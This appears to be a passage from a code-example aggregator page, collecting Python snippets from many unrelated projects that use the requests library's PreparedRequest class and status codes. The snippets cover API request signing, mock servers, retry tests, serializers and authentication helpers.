        controller = VeraController("http://127.0.0.1:123")
        controller.data_request({"id": "sdata"})
        controller.start()

        # Stop the controller after the test stops and fixture is torn down.
        self.pytest_req.addfinalizer(controller.stop)

        return VeraControllerData(api_data=api_data, controller=controller) 
**************************************
def _post_servers(self, request):
        # type: (requests.PreparedRequest) -> requests.Response
        data = parse_qs(force_text(request.body))

        self.server_id = self._public_id('srv')
        self.auth_token = ''.join(random.choice(mixed_alphabet) for i in xrange(20))
        self.api_version = force_text(request.headers['X-Cloak-API-Version'])
        self.name = data['name'][0]
        self.target_id = data['target'][0]

        # Make sure these exist
        data['email'][0]
        data['password'][0]

        result = {
            'server_id': self.server_id,
            'auth_token': self.auth_token,
            'server': self._server_result(),
        }

        return self._response(request, 201, result) 
**************************************
def _post_server_csr(self, request):
        # type: (requests.PreparedRequest) -> requests.Response
        data = parse_qs(force_text(request.body))

        if self._authenticate(request):
            self.csr = data['csr'][0]
            self.pki_tag = ''.join(random.choice(mixed_alphabet) for i in xrange(16))
            response = self._response(request, 202)
        else:
            response = self._response(request, 401)

        return response

    #
    # Utils
    # 
**************************************
def _response(self, request, status, result=None, headers={}):
        # type: (requests.PreparedRequest, int, Any, Dict[str, str]) -> requests.Response
        response = requests.Response()
        response.status_code = status
        response.url = request.url

        if result is not None:
            response.raw = io.BytesIO(json.dumps(result).encode('utf-8'))
            response.encoding = 'utf-8'
        else:
            response.raw = io.BytesIO(b'')
            response.encoding = 'latin1'

        response.headers.update(headers)

        return response 
**************************************
def __init__(self, key:str = None, secret:str = None, testing:bool = False, timeout:Union[float, Tuple[float, float], None] = 5.0):
        """
        Construct a new object for making API requests.

        :param key: The API key from the TheNounProject API. (defaults to None)
        :type key: str
        :param secret: The secret key from the TheNounProject API. (defaults to None)
        :type secret: str
        :param testing: Whether the methods should return a PreparedRequest, 
                        instead of data from the API. Should not be used except for testing this wrapper. (defaults to False)
        :type testing: bool
        :param timeout: Float timeout in seconds, 2-tuples for seperate connect and read timeouts, and None for no timeout. (defaults to 5.0)
        :type timeout: Union[float, Tuple[float, float], None]
        """
        self.api_key = key
        self.secret_key = secret
        self._testing = testing
        self._timeout = timeout
        
        self._method: str
        self._base_url = "http://api.thenounproject.com"
        self._session = requests.Session() 
**************************************
def _prepare_url(self, url: str, **params: dict) -> requests.PreparedRequest:
        """
        Returns a requests.PreparedRequest object for a request self._method as method, 
        for the given URL, with the given parameters/json, with authentication.

        :param url: The URL of the requested endpoint.
        :type url: str
        :param params: The parameters to be added onto the string.
        :type params: dict

        :returns: A requests.PreparedRequest object.
        :rtype: requests.PreparedRequest 
        """
        if self._session.auth is None:
            self._session.auth = self._get_oauth()
        req = requests.Request(self._method, url, **{"params" if self._method == "GET" else "json": params})
        return self._session.prepare_request(req) 
**************************************
def _challenge_request(self, response, **kwargs):
        """Forms a CHAP request based on a real PreparedRequest.

        Args:
            response: The original 401 requests.Response() instance.
            **kwargs: Keyword arguments to pass with subsequent requests.

        Returns:
            An instance of requests.Response() with the appropriate
                'X-CHAP:challenge' header.
        """
        logging.debug('Sending challenge request')
        request = _consume_response(response)
        if self.version == 0:
            challenge = self.username
        else:
            challenge = crtauth_client.create_request(self.username)
        request.headers['X-CHAP'] = 'request:%s' % challenge
        request.url = _auth_url(request.url)
        # HEAD is no longer required as of crtauth 0.99.3, but it shouldn't
        # hurt for compatibility with older versions.
        request.method = 'HEAD'
        challenge_response = response.connection.send(request, **kwargs)
        challenge_response.history.append(response)
        return challenge_response 
**************************************
def _sign(self, req: PreparedRequest) -> PreparedRequest:
        method = req.method.upper()
        parsed = urllib.parse.urlsplit(req.url)
        path = parsed.path
        if parsed.query:
            path += '?' + parsed.query

        expiration = str(int(unix_timestamp() + 10))
        message = method + path + expiration
        if req.body:
            message += req.body

        signature = hmac.new(self.api_secret.encode(), message.encode(), hashlib.sha256).hexdigest()
        headers = {
            'api-expires': expiration,
            'api-key': self.api_key,
            'api-signature': signature,
            'Content-Type': 'application/json',
        }
        req.headers.update(headers)
        return req 
**************************************
def _sign(self, req: PreparedRequest) -> PreparedRequest:
        nonce = str(int(unix_timestamp() * 1000))

        data = nonce
        method = req.method.upper()
        if method == 'GET':
            parsed = urllib.parse.urlsplit(req.url)
            path = parsed.path
            if parsed.query:
                path += '?' + parsed.query
            data += path
        else:
            if req.body:
                data += req.body

        secret = self.api_secret.encode()
        signature = hmac.new(secret, data.encode(), hashlib.sha256).hexdigest()
        headers = {
            'ACCESS-KEY': self.api_key,
            'ACCESS-NONCE': nonce,
            'ACCESS-SIGNATURE': signature,
            'Content-Type': 'application/json',
        }
        req.headers.update(headers)
        return req 
**************************************
def make_url(self, container=None, resource=None, query_items=None):
        """Create a URL from the specified parts."""
        pth = [self._base_url]
        if container:
            pth.append(container.strip('/'))
        if resource:
            pth.append(resource)
        else:
            pth.append('')
        url = '/'.join(pth)
        if isinstance(query_items, (list, tuple, set)):
            url += RestHttp._list_query_str(query_items)
            query_items = None
        p = requests.PreparedRequest()
        p.prepare_url(url, query_items)
        return p.url 
**************************************
def decode(self, o):
        """
        Decode the contents of the given JSON dictionary as an object used by Web Sight.
        :param o: The JSON dictionary to process.
        :return: The contents of the given JSON dictionary deserialized into an object.
        """
        from lib.arin.response import BaseArinResponse
        from ..geolocation import IpGeolocation
        if "__class_type" not in o:
            raise UnsupportedDeserializationError("No class type specified in JSON dictionary: %s" % o)
        class_type = o["__class_type"]
        deserialization_class = get_class_from_import_string(class_type)
        if deserialization_class == PreparedRequest:
            return self.__deserialize_requests_prepared_request(o)
        elif deserialization_class == Response:
            return self.__deserialize_requests_response(o)
        elif issubclass(deserialization_class, BaseArinResponse):
            return self.__deserialize_arin_response(o)
        elif deserialization_class == IpGeolocation:
            return self.__deserialize_ip_geolocation(o)
        else:
            raise UnsupportedDeserializationError(
                "Class %s does not have a deserialization method."
                % deserialization_class
            ) 
**************************************
def encode(self, o):
        """
        Encode the contents of the given object into JSON.
        :param o: The object to process.
        :return: The contents of the given object in JSON format.
        """
        from lib.arin.response import BaseArinResponse
        from ..geolocation import IpGeolocation
        if isinstance(o, PreparedRequest):
            return self.__serialize_requests_prepared_request(o)
        elif isinstance(o, Response):
            return self.__serialize_requests_response(o)
        elif isinstance(o, BaseArinResponse):
            return self.__serialize_arin_response(o)
        elif isinstance(o, IpGeolocation):
            return self.__serialize_ip_geolocation(o)
        else:
            return super(WsSerializableJSONEncoder, self).encode(o)

    # Protected Methods

    # Private Methods 
**************************************
def __init__(self,
               status_code: int,
               name: str,
               method: Optional[PreparedRequest],
               message: str):
    """Initializes container for holding HTTP status information.

    :param status_code: HTTP status code.
    :param name: HTTP status name.
    :param method: HTTP method used.
    :param message: Exception message/reason.
    """
    super(ZoomAPIException, self).__init__()
    self.status_code = status_code
    self.name = name
    self.method = method
    self.message = message 
**************************************
def request(self) -> requests.PreparedRequest:
        return self.response.request 
**************************************
def __call__(self, r: PreparedRequest):
        r.headers['Authorization'] = f'Token {self.token}'

        return r 
**************************************
def rate_limit_send_request(self, req: requests.PreparedRequest, send_args: dict=None, proxies: dict=None):
        gevent.sleep(0)
        with self._semaphore:
            last, current = self._last_time, default_timer()
            elapsed = current - last
            if elapsed < self._interval:
                gevent.sleep(self._interval - elapsed)
            self._last_time = default_timer()

            return self._session.send(req, verify=False, proxies=proxies,
                                      timeout=self._default_request_timeout, **send_args) 
**************************************
def send(self, request):
        assert isinstance(request, requests.PreparedRequest)
        self._logs.append(request)
        rep = self._req_to_rep[(request.method, request.url)]
        if isinstance(rep, Exception):
            raise rep
        elif isinstance(rep, list):
            return MockResponse(*rep.pop(0))
        else:
            return MockResponse(*rep) 
**************************************
def test_no_retry(self):
        session = MockSession({('GET', 'http://uri_1/'): (400, 'error!')})
        client = clients.Client(
            retry_policy=policies.NoRetry(),
            _session=session,
            _sleep=fake_sleep,
        )
        with self.assertRaises(clients.HttpError):
            client.get('http://uri_1')
        self.assertEqual(1, len(session._logs))
        for req in session._logs:
            self.assertTrue(isinstance(req, requests.PreparedRequest))
            self.assertEqual('GET', req.method)
            self.assertEqual('http://uri_1/', req.url) 
**************************************
def test_retry(self):
        N = 16
        session = MockSession({
            ('GET', 'http://uri_1/'): (400, 'error!'),
            ('GET', 'http://uri_2/'): [
                (400, 'error!'),
                (400, 'error!'),
                (400, 'error!'),
                (200, 'success'),
            ],
        })
        client = clients.Client(
            retry_policy=policies.BinaryExponentialBackoff(N),
            _session=session,
            _sleep=fake_sleep,
        )

        session._logs.clear()
        with self.assertRaises(clients.HttpError):
            client.get('http://uri_1')
        self.assertEqual(1 + N, len(session._logs))
        for req in session._logs:
            self.assertTrue(isinstance(req, requests.PreparedRequest))
            self.assertEqual('GET', req.method)
            self.assertEqual('http://uri_1/', req.url)

        session._logs.clear()
        self.assertEqual('success', client.get('http://uri_2').content)
        self.assertEqual(4, len(session._logs))
        for req in session._logs:
            self.assertTrue(isinstance(req, requests.PreparedRequest))
            self.assertEqual('GET', req.method)
            self.assertEqual('http://uri_2/', req.url) 
**************************************
def __init__(self, response):
        assert isinstance(response, requests.Response)

        # Extended exception attributes
        self.response = response
        """The :class:`requests.Response` object returned from the API call."""

        self.request = self.response.request
        """The :class:`requests.PreparedRequest` of the API call."""

        self.status_code = self.response.status_code
        """The HTTP status code from the API response."""

        self.status = self.response.reason
        """The HTTP status from the API response."""

        self.details = None
        """The parsed JSON details from the API response."""
        if "application/json" in \
                self.response.headers.get("Content-Type", "").lower():
            try:
                self.details = self.response.json()
            except ValueError:
                logger.warning("Error parsing JSON response body")

        self.message = self.details.get("message") or\
            self.details.get("response", {}).get("message")\
            if self.details else None
        """The error message from the parsed API response."""

        self.description = RESPONSE_CODES.get(self.status_code)
        """A description of the HTTP Response Code from the API docs."""

        super(ApiError, self).__init__(
            "[{status_code}]{status} - {message}".format(
                status_code=self.status_code,
                status=" " + self.status if self.status else "",
                message=self.message or self.description or "Unknown Error",
            )
        ) 
**************************************
def handle_request(
    req: requests.PreparedRequest, api_data: VeraApiData
) -> ResponsesResponse:
    """Handle a request for data from the controller."""
    url_parts = urlparse(req.url)
    qs_parts: dict = parse_qs(url_parts.query)
    payload = {}
    for key, value in qs_parts.items():
        payload[key] = value[0]

    payload_id = payload.get("id")

    response: ResponsesResponse = (200, {}, "")
    if payload_id == "sdata":
        response = 200, {}, json.dumps(api_data.sdata)
    if payload_id == "status":
        response = 200, {}, json.dumps(api_data.status)
    if payload_id == "lu_sdata":
        response = 200, {}, json.dumps(api_data.lu_sdata)
    if payload_id == "action":
        response = 200, {}, json.dumps({})
    if payload_id == "variableget":
        response = handle_variable_get(payload, api_data)
    if payload_id == "lu_action":
        response = handle_lu_action(payload, api_data)

    return response 
**************************************
def _get_server(self, request):
        # type: (requests.PreparedRequest) -> requests.Response
        if self._authenticate(request):
            result = self._server_result()
            response = self._response(request, 200, result)
        else:
            response = self._response(request, 401)

        return response 
**************************************
def _get_server_pki(self, request):
        # type: (requests.PreparedRequest) -> requests.Response
        query = parse_qs(force_text(urlparse(request.url).query))

        try:
            tag = query['tag'][0]
        except LookupError:
            tag = None

        if self._authenticate(request):
            result = None  # type: Dict[str, Any]

            if self.csr is None:
                result = {
                    'anchor': None, 'server_ca': None, 'client_ca': None,
                    'entity': None, 'crls': [], 'tag': None,
                }
                response = self._response(request, 200, result)
            elif (tag is not None) and (tag == self.pki_tag):
                response = self._response(request, 304)
            else:
                result = {
                    'anchor': self._cert_result('anchor'),
                    'server_ca': self._cert_result('server_ca'),
                    'client_ca': self._cert_result('client_ca'),
                    'entity': self._cert_result('entity'),
                    'crls': ['http://crl.example.com/server.crl'],
                    'tag': self.pki_tag,
                }
                response = self._response(request, 200, result)
        else:
            response = self._response(request, 401)

        return response 
**************************************
def _post_server(self, request):
        # type: (requests.PreparedRequest) -> requests.Response
        data = parse_qs(force_text(request.body))

        if 'name' in data:
            self.name = data['name'][0]
        if 'api_version' in data:
            self.api_version = data['api_version'][0]

        return self._response(request, 200, self._server_result()) 
**************************************
def _send(self, url: requests.PreparedRequest) -> requests.Response:
        """
        :param url: The PreparedRequest with the method, URL and parameters for the request.
        :type url: requests.PreparedRequest

        :returns: Returns a requests.Response object generated by performing the URL request with our session.
        :rtype: requests.Response
        """
        return self._session.send(url, timeout=self._timeout) 
**************************************
def _consume_response(response):
    """Consume content and release the original connection.

    Args:
        response: A requests.Response to whose connection to reuse.

    Returns:
        requests.PreparedRequest, a copy of the response's request.
    """
    response.content
    response.close()
    return response.request.copy() 
**************************************
def send(self, request: requests.PreparedRequest, **kwargs) -> requests.Response:
        res = super().send(request, **kwargs)
        if self.cache_type == CacheType.AFTER_EACH_REQUEST or (
                self.cache_type == CacheType.AFTER_EACH_POST and
                request.method and request.method.lower() == 'post'
        ):
            self.cache_session()
        return res 
**************************************
def send_and_construct(prepared_request, session=None, verify=False, request_factory=requests.Request,
                           builder=SirenBuilder):
        """
        Takes a PreparedRequest object and sends it and then constructs the SirenObject from the response.

        :param requests.PreparedRequest prepared_request: The initial request to send.
        :param requests.Session session : Existing session to use for requests.
        :param bool verify: whether to verify ssl certificates from the server or ignore them (should be false for
            local dev)
        :param type|function request_factory: constructor of request object
        :param builder:  The object to build the hypermedia object
        :return: The object representing the siren object returned from the server.
        :rtype: object
        :raises: ConnectError
        """
        session = session or requests.Session()
        try:
            response = session.send(prepared_request, verify=verify)
        except requests.exceptions.ConnectionError as e:
            # this is the deprecated form but it preserves the stack trace so let's use this
            # it's not like this is going to be a big problem when porting to Python 3 in the future
            raise ConnectError('Unable to connect to server! Unable to construct client. root_url="{0}" verify="{1}"'.
                               format(prepared_request.url, verify), e)

        builder = builder(verify=verify, request_factory=request_factory)
        obj = builder.from_api_response(response)
        return obj.as_python_object() 
**************************************
def test_as_request_get(self):
        action = SirenAction('action', 'http://blah.com', 'application/json')
        resp = action.as_request(x=1, y=2)
        self.assertIsInstance(resp, PreparedRequest)
        self.assertEqual(resp.method, 'GET')
        self.assertIn('y=2', resp.path_url)
        self.assertIn('x=1', resp.path_url) 
**************************************
def test_as_request_post(self):
        action = SirenAction('action', 'http://blah.com', 'application/json', method='POST')
        resp = action.as_request(x=1, y=2)
        self.assertIsInstance(resp, PreparedRequest)
        self.assertEqual(resp.method, 'POST')
        self.assertEqual('/', resp.path_url) 
**************************************
def test_as_request_delete(self):
        action = SirenAction('action', 'http://blah.com', 'application/json', method='DELETE')
        resp = action.as_request(x=1, y=2)
        self.assertIsInstance(resp, PreparedRequest)
        self.assertEqual(resp.method, 'DELETE')
        self.assertEqual('/', resp.path_url) 
**************************************
def test_make_request(self):
        action = SirenAction('action', 'http://blah.com', 'application/json')
        mck = mock.Mock(send=mock.Mock(return_value=True))
        resp = action.make_request(_session=mck, x=1, y=2)
        self.assertTrue(resp)
        self.assertEqual(mck.send.call_count, 1)
        self.assertIsInstance(mck.send.call_args[0][0], PreparedRequest) 
**************************************
def _sign(self, req: PreparedRequest) -> PreparedRequest:
        pass 
**************************************
def _sign(self, req: PreparedRequest) -> PreparedRequest:
        nonce = str(unix_timestamp())

        method = req.method.upper()
        parsed = urllib.parse.urlsplit(req.url)
        path = parsed.path

        body = ''
        if method == 'GET':
            parsed = urllib.parse.urlsplit(req.url)
            if parsed.query:
                body = '?' + parsed.query
        else:
            if req.body:
                body = req.body

        text = (nonce + method + path + body).encode()
        secret = self.api_secret.encode()
        signature = hmac.new(secret, text, hashlib.sha256).hexdigest()
        headers = {
            'ACCESS-KEY': self.api_key,
            'ACCESS-TIMESTAMP': nonce,
            'ACCESS-SIGN': signature,
            'Content-Type': 'application/json',
        }
        req.headers.update(headers)
        return req 
**************************************
def _sign(self, req: PreparedRequest) -> PreparedRequest:
        nonce = str(int(unix_timestamp() * 1000))

        parsed = urllib.parse.urlsplit(req.url)

        method = req.method.upper()
        assert method == 'POST', 'private POST only'
        data = {}
        if req.body:
            data = json.loads(req.body)
        data.update({
            'nonce': nonce,
            'request': parsed.path,
        })
        payload = base64.b64encode(json.dumps(data).encode())
        secret = self.api_secret.encode()
        signature = hmac.new(secret, payload, hashlib.sha384).hexdigest()
        # noinspection SpellCheckingInspection
        headers = {
            'X-BFX-APIKEY': self.api_key,
            'X-BFX-PAYLOAD': payload.decode(),
            'X-BFX-SIGNATURE': signature,
            'Content-Type': 'application/json',
        }
        req.headers.update(headers)
        return req 
**************************************
def __call__(self, r: requests.PreparedRequest):
        r.prepare_cookies({self._name: self._value})
        return r 
**************************************
def __call__(self, r: requests.PreparedRequest):
        r.prepare_url(r.url, {'token': self._token})
        return r 
**************************************
def test_token(self):
        token = TokenAuth('tokenvalue')
        req = PreparedRequest()
        req.url = 'http://test.com/'
        req.method='GET'
        req.prepare_auth(token)
        self.assertEqual(req.url, 'http://test.com/?token=tokenvalue') 
**************************************
def get_supported_serialization_classes():
    """
    Get a list of the classes that are currently supported for serialization.
    :return: A list of the classes that are currently supported for serialization.
    """
    from lib.arin.response import BaseArinResponse
    from ..geolocation import IpGeolocation
    return [
        PreparedRequest,
        Response,
        BaseArinResponse,
        IpGeolocation,
    ] 
**************************************
def __deserialize_requests_prepared_request(self, to_deserialize):
        """
        Create and return a PreparedRequest based on the contents of the given dictionary.
        :param to_deserialize: The dictionary to create the PreparedRequest from.
        :return: A PreparedRequest created by the contents of to_deserialize.
        """
        to_return = PreparedRequest()
        to_return.method = to_deserialize["method"]
        to_return.url = to_deserialize["url"]
        to_return.headers = to_deserialize["headers"]
        to_return.body = to_deserialize["body"]
        return to_return 
**************************************
def __serialize_requests_prepared_request(self, to_serialize):
        """
        Serialize the contents of the given requests library request object to a JSON dictionary. A request is
        populated by the requests session object as follows:

        def copy(self):
            p = PreparedRequest()
            p.method = self.method
            p.url = self.url
            p.headers = self.headers.copy() if self.headers is not None else None
            p._cookies = _copy_cookie_jar(self._cookies)
            p.body = self.body
            p.hooks = self.hooks
            p._body_position = self._body_position
            return p

        :param to_serialize: The request object to serialize.
        :return: A JSON object representing the contents of the given request.
        """
        return {
            "method": to_serialize.method,
            "url": to_serialize.url,
            "headers": dict(to_serialize.headers),
            "body": to_serialize.body,
            "__class_type": get_import_path_for_type(to_serialize),
        } 
**************************************
def __init__(self, response):
        assert isinstance(response, requests.Response)

        # Extended exception attributes
        self.response = response
        """The :class:`requests.Response` object returned from the API call."""

        self.request = self.response.request
        """The :class:`requests.PreparedRequest` of the API call."""

        self.status_code = self.response.status_code
        """The HTTP status code from the API response."""

        self.status = self.response.reason
        """The HTTP status from the API response."""

        self.details = None
        """The parsed JSON details from the API response."""
        if "application/json" in \
                self.response.headers.get("Content-Type", "").lower():
            try:
                self.details = self.response.json()
            except ValueError:
                logger.warning("Error parsing JSON response body")

        self.message = self.details.get("message") if self.details else None
        """The error message from the parsed API response."""

        self.description = RESPONSE_CODES.get(self.status_code)
        """A description of the HTTP Response Code from the API docs."""

        super(ApiError, self).__init__(
            "[{status_code}]{status} - {message}".format(
                status_code=self.status_code,
                status=" " + self.status if self.status else "",
                message=self.message or self.description or "Unknown Error",
            )
        ) 
**************************************
def mock_request(self):
        r = mock.create_autospec(requests.PreparedRequest(), spec_set=True, instance=True)
        r.body = "payload"
        r.path_url = "uri"
        r.headers = {}
        return r 
**************************************
def test_generate_launch_request(self):
        launch_params = {
            'lti_version': 'foo',
            'lti_message_type': 'bar',
            'resource_link_id': 'baz'
        }
        tc = ToolConsumer('client_key', 'client_secret',
                          launch_url='http://example.edu/',
                          params=launch_params)
        launch_req = tc.generate_launch_request(nonce='abcd1234',
                                                timestamp='1234567890')

        self.assertIsInstance(launch_req, PreparedRequest)

        got = parse_qs(unquote(launch_req.body))
        correct = launch_params.copy()
        correct.update({
            'oauth_nonce': 'abcd1234',
            'oauth_timestamp': '1234567890',
            'oauth_version': '1.0',
            'oauth_signature_method': 'HMAC-SHA1',
            'oauth_consumer_key': 'client_key',
            'oauth_signature': 'u2xlj 1gF4y 6gKHNeiL9cN3tOI=',
        })

        self.assertEqual(got, correct) 
**************************************
def test_http_method(self):
    unknown_method = ZoomAPIException(0, 'Test', None, 'Test message')
    self.assertEqual(unknown_method.http_method, None)

    req = PreparedRequest()
    req.prepare_method('GET')
    known_method = ZoomAPIException(0, 'Test', req, 'Message')

    self.assertEqual(known_method.http_method, 'GET') 
**************************************
def __init__(self, response):
        assert isinstance(response, requests.Response)

        # Extended exception attributes
        self.response = response
        """The :class:`requests.Response` object returned from the API call."""

        self.request = self.response.request
        """The :class:`requests.PreparedRequest` of the API call."""

        self.status_code = self.response.status_code
        """The HTTP status code from the API response."""

        self.status = self.response.reason
        """The HTTP status from the API response."""

        self.details = None
        """The parsed JSON details from the API response."""
        if "application/json" in \
                self.response.headers.get("Content-Type", "").lower():
            try:
                self.details = self.response.json()
            except ValueError:
                logger.warning("Error parsing JSON response body")

        self.message = self.details.get("message") or\
            self.details.get("response", {}).get("message")\
            if self.details else None
        """The error message from the parsed API response."""

        self.description = RESPONSE_CODES.get(self.status_code)
        """A description of the HTTP Response Code from the API docs."""

        super(ApiError, self).__init__(
            "[{status_code}]{status} - {message}".format(
                status_code=self.status_code,
                status=" " + self.status if self.status else "",
                message=self.message or self.description or "Unknown Error",
            )
        ) 
**************************************
def extractor_before_request(self, request):
        self.called += 1
        assert_true(isinstance(request, requests.PreparedRequest))
        request.url = 'http://test-url.example.com/file.pdf'
        return request 
**************************************
def test_fetch_page_error(self, mock_get_region, mock_proxies,
                              mock_headers,
                              mock_requests):
        """Tests that fetch_page successfully handles error responses."""
        url = "/around/the/world"
        region = "us_sd"
        initial_task = "work_it"

        mock_get_region.return_value = mock_region(region)
        proxies = {'http': 'http://user:[email protected]/'}
        mock_proxies.return_value = proxies
        headers = {'User-Agent': 'test_user_agent'}
        mock_headers.return_value = headers

        original_request = requests.PreparedRequest()
        original_request.headers = headers
        original_request.method = 'GET'
        original_request.body = None

        # test a few types of errors
        errors = {
            500: 'SERVER ERROR',
            502: 'PROXY ERROR',
            503: 'SERVICE UNAVAILABLE',
        }

        error_response = requests.Response()
        error_response.headers = {}
        error_response.request = original_request
        for code, name in errors.items():
            error_response.status_code = code
            error_response.reason = name
            mock_requests.return_value = error_response

            scraper = FakeScraper(region, initial_task)
            with pytest.raises(FetchPageError):
                scraper.fetch_page(url)

            mock_get_region.assert_called_with(region)
            mock_proxies.assert_called_with()
            mock_headers.assert_called_with()
            mock_requests.assert_called_with(
                url, proxies=proxies, headers=headers, cookies=None,
                params=None, verify=False) 
**************************************
def fetch(uri, username, password, endpoint=None, **data):
    # type: (Text, Text, Text, Optional[Text], **Any) -> Dict[Text, Any]
    """Perform post given URI with auth and provided data."""
    req = requests.Request('POST', uri, auth=(username, password), data=data)
    prepared = req.prepare()  # type: requests.PreparedRequest

    timeout = time.time() + app.config['OAUTH_FETCH_TOTAL_TIMEOUT']
    retry = 0

    result = _error(
        errors.SERVER_ERROR, 'An unknown error occurred talking to provider.'
    )

    for i in range(app.config['OAUTH_FETCH_TOTAL_RETRIES']):
        prefix = 'attempt #%d %s' % (i + 1, uri)

        # TODO: Add jitter to backoff and/or retry after?
        backoff = (2 ** i - 1) * app.config['OAUTH_FETCH_BACKOFF_FACTOR']
        remaining_timeout = timeout - time.time()

        if (retry or backoff) > remaining_timeout:
            app.logger.debug('Abort %s no timeout remaining.', prefix)
            break
        elif (retry or backoff) > 0:
            app.logger.debug('Retry %s [sleep %.3f]', prefix, retry or backoff)
            time.sleep(retry or backoff)

        result, status, retry = _fetch(prepared, remaining_timeout, endpoint)

        labels = {'endpoint': endpoint, 'status': stats.status(status)}
        stats.ClientRetryHistogram.labels(**labels).observe(i)

        if status is not None and 'error' in result:
            error = result['error']
            error = app.config['OAUTH_FETCH_ERROR_TYPES'].get(error, error)
            if error not in errors.DESCRIPTIONS:
                error = 'invalid_error'
            stats.ClientErrorCounter.labels(error=error, **labels).inc()

        if status is None:
            pass  # We didn't even get a response, so try again.
        elif status not in app.config['OAUTH_FETCH_RETRY_STATUS_CODES']:
            break
        elif 'error' not in result:
            break  # No error reported so might as well return it.

        app.logger.debug(
            'Result %s [status %s] [retry after %s]', prefix, status, retry
        )

    # TODO: consider returning retry after time so it can be used.
    return result 

Python requests.codes() Examples

**************************************
def login(user, password):
    global session
    url = _getURL(LOGIN_URI)
    headers = {'ACCEPT': 'application/json'}
    if session:
        session.close()
    session = requests.session()
    response = session.get(url, auth=(user, password), verify=False, headers=headers)
    logger.info(response)
    if response.status_code != requests.codes['ok']:
        # for invalid credentials ViPR returns html
        if 'text/html' in response.headers['Content-Type']:
            err = "Invalid username or password"
        else:
            error_json = json.loads(response.text)
            err = error_json["details"]
        raise Exception(err)
    if 'x-sds-auth-token' not in response.headers:
        raise Exception("Invalid Login")
    token = response.headers['x-sds-auth-token']

    return token 
**************************************
def get_ffdc(self,url, session, uuid):
        url = url + '/ffdc/endpoint'
        try:
            if uuid:
                url = url + '/' + uuid
                resp = session.get(url,verify=False, timeout=REST_TIMEOUT)
                resp.raise_for_status()
                if resp.status_code == requests.codes['ok'] or resp.status_code == requests.codes['created'] or resp.status_code == requests.codes['accepted']:
                    job_info = ast.literal_eval(resp.content)
                    if "jobURL" in job_info:
                        job = job_info["jobURL"].split("/")[-1]
                        return job
                    else:
                        return resp
            else:
                logger.error("Invalid execution of ffdc REST API mandatory parameter uuid is missing")
                raise Exception("Invalid execution of ffdc REST API mandatory parameter uuid is missing")

        except HTTPError as re:
            logger.error("Exception occured: %s",re)
            raise re 
**************************************
def send_request(self, payload, **kwargs):
        # type: (dict, dict) -> dict
        kwargs.setdefault('headers', {})
        for key, value in iteritems(self.DEFAULT_HEADERS):
            kwargs['headers'].setdefault(key, value)

        response = self._send_http_request(
            # Use a custom JSON encoder that knows how to convert Tryte
            # values.
            payload=JsonEncoder().encode(payload),

            url=self.node_url,
            **kwargs
        )

        return self._interpret_response(response, payload, {codes['ok']}) 
**************************************
def get_request_auth_headers(self):
        url, data, headers = auth.create_access_token_request_params(self)
        response = requests.post(url=url, headers=headers, data=data)

        self.access_token = None
        if response and response.status_code == requests.codes["ok"]:
            response_json = response.json()
            self.access_token = response_json["access_token"]

        self.headers.update(
            {
                "Authorization": "Bearer {}".format(self.access_token),
                "apikey": self.api_key,
                "User-Agent": self.user_agent,
            }
        )
        return self.headers 
**************************************
def _post_request_callback(self, response, *args, **kwargs):
        req = response.request
        retry = getattr(req, "authentication_retry", True)

        if retry and response.status_code == requests.codes.unauthorized:
            logger.debug(
                {"message": "reauthenticating and retrying once", "url": req.url}
            )
            req.authentication_retry = False
            req.headers.update(self.get_request_auth_headers())
            response = self.send(req)
        else:
            for hook in self._post_hooks:
                hook(self, response)

        return response 
**************************************
def change_password(api_url, username, password, token):
    """Change password of user and set it's email to [email protected]"""

    post_data = {
        "username": username,
        "password": password,
        "password_confirmation": password,
        "email": "{}@{}".format(username, 'localhost.localdomain')}
    request = requests.put(
        "{}users/{}".format(api_url, username),
        data=json.dumps(post_data),
        headers={"Authorization": "Bearer {}".format(token)})
    if request.status_code == requests.codes["ok"]:
        return request.json()
    else:
        response = {"url": request.url, "data": post_data, "token": token, "text": request.text}
        MODULE.fail_json(msg="Request to server failed.", meta=response) 
**************************************
def get_user_info(user_id):
    """
    Returns info about a user

    See https://api.slack.com/methods/users.info for the contents of info
    """
    api_url = 'https://slack.com/api/users.info'
    response = requests.get(api_url, params={'token': UQCSTESTING_USER_TOKEN, 'user': user_id})

    if response.status_code != requests.codes['ok']:
        LOGGER.error(f'Received status code {response.status.code}')
        sys.exit(1)

    json_contents = json.loads(response.content)
    if not json_contents['ok']:
        LOGGER.error(json_contents['error'])
        sys.exit(1)

    return json_contents 
**************************************
def test_suggest(self, mockrequests):
        viaf = ViafAPI()
        mockrequests.codes = requests.codes
        # Check that query with no matches still returns an empty list
        mock_result = {'query': 'notanauthor', 'result': None}
        mockrequests.get.return_value.status_code = requests.codes.ok
        mockrequests.get.return_value.json.return_value = mock_result
        assert viaf.suggest('notanauthor') == []
        mockrequests.get.assert_called_with(
            'https://www.viaf.org/viaf/AutoSuggest',
            params={'query': 'notanauthor'})

        # valid (abbreviated) response
        mock_result['result'] = [{
          "term": "Austen, Jane, 1775-1817",
          "displayForm": "Austen, Jane, 1775-1817",
          "recordID": "102333412"
        }]
        mockrequests.get.return_value.json.return_value = mock_result
        assert viaf.suggest('austen') == mock_result['result']

        # bad status code on the response - should still return an empty list
        mockrequests.get.return_value.status_code = requests.codes.forbidden
        assert viaf.suggest('test') == [] 
**************************************
def _feedparser_parse_with_options(self) -> Tuple[feedparser.FeedParserDict, "UpdateResult"]:
        """
        Perform a feedparser parse, providing arguments (like etag) we might want it to use.
        Don't provide etag/last_modified if the last get was unsuccessful.
        """
        if self.feed_state.last_modified is not None:
            last_mod = self.feed_state.last_modified.timetuple()
        else:
            last_mod = None

        # NOTE - this naming is a bit confusing here - parser is really a thing you call with
        # arguments to get a feedparser result.
        # Maybe better called parser-generator, or parse-performer or something?
        parsed = self.parser(self.url, self.feed_state.etag, last_mod)

        self.feed_state.etag = parsed.get("etag", self.feed_state.etag)
        self.feed_state.store_last_modified(parsed.get("modified_parsed", None))

        # Detect bozo errors (malformed RSS/ATOM feeds).
        if "status" not in parsed and parsed.get("bozo", None) == 1:
            # NOTE: Feedparser documentation indicates that you can always call getMessage, but
            # it's possible for feedparser to spit out a URLError, which doesn't have getMessage.
            # Catch this case.
            if hasattr(parsed.bozo_exception, "getMessage()"):
                msg = parsed.bozo_exception.getMessage()

            else:
                msg = repr(parsed.bozo_exception)

            LOG.info(f"Unable to retrieve feed for {self.metadata['name']} from {self.url}.")
            LOG.debug(f"Update failed because bozo exception {msg} occurred.")
            return (None, UpdateResult.FAILURE)

        elif parsed.get("status") == requests.codes["NOT_MODIFIED"]:
            LOG.debug("No update to feed, nothing to do.")
